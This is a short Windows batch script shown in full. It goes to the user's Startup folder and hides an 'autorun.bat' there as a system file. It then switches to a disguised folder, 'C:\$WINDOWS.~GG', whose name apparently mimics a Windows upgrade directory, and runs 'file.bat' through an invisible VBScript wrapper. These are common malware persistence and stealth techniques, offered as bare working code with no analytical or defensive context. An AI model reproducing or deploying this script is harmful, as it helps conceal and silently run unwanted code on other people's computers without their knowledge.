@echo off
cd %appdata%
cd Microsoft
cd Windows
cd "Start Menu"
cd Programs
cd Startup
attrib +s +h autorun.bat
c:
cd C:\
cd $WINDOWS.~GG
wscript.exe invisible.vbs file.bat